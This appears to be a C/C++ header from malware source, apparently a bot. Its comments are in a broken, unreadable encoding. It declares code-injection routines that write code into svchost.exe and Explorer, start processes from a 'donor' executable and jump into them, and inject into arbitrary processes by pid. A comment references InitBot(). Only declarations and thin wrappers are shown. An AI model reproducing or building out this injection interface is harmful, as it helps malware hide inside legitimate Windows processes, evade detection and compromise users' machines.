#pragma once

#include "core\core.h"

typedef SIZE_T (*typeInjectCode )( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage );
typedef bool (*typeRunInjectCode)( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );

//������ ���� � ������� ��������� ������ ������ � ������� ����������, ����� ����������� �������
SIZE_T InjectCode( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage );
//������ ���� � ������� ��������� ������������� ������ � �������, ���������� ����� ����������� �������
SIZE_T InjectCode2( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage );

//������ ������ ����� ��������� ������ � ������� ������������ �������
bool RunInjectCode( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );
//������ ������ ����� ��������� ������ ������ ������
bool RunInjectCode2( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );
//������ ������ ����� ������ ������ ���������� �������
bool RunInjectCode3( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func );

DWORD JmpToSvchost( typeRunInjectCode funcRunInjectCode, typeInjectCode funcInjectCode, typeFuncThread func, const char* exeDonor, const char* nameUser = 0 );

inline DWORD JmpToSvchost1( typeFuncThread func, const char* exeDonor, const char* nameUser = 0 )
{
	return JmpToSvchost( &RunInjectCode, &InjectCode2, func, exeDonor, nameUser );
}

inline DWORD JmpToSvchost2( typeFuncThread func, const char* exeDonor, const char* nameUser = 0 )
{
	return JmpToSvchost( &RunInjectCode2, &InjectCode, func, exeDonor, nameUser );
}
//�������� svchost.exe ����� �� ��������, ���������� pid ����������� ��������
DWORD JmpToSvchost( typeFuncThread func, const char* exeDonor, const char* nameUser = 0 );

//��������� Explorer � ���������� � ����
bool JmpToExplorer( typeFuncThread func );
//���������� � ��������� ����������� ����������, � ���� ������� ����������� ������� InitBot(), ������� � func �� �������� �� �����
bool InjectToExplorer32( typeFuncThread func );
//������ � ������� � ������� InjectCode
bool InjectIntoProcess1( DWORD pid, typeFuncThread func );
//������ � ������� � ������� InjectCode2
bool InjectIntoProcess2( DWORD pid, typeFuncThread func );
//������ � ������� � ������� InjectCode � ������ ����� RunInjectCode
bool InjectIntoProcess3( DWORD pid, HANDLE hthread, typeFuncThread func );
//������ svchost � ������ �����, � ����� ����������� ��������� � ����
DWORD RunSvchost( HANDLE* hprocess, HANDLE* hthread, const char*exeDonor, const char* nameUser = 0 );
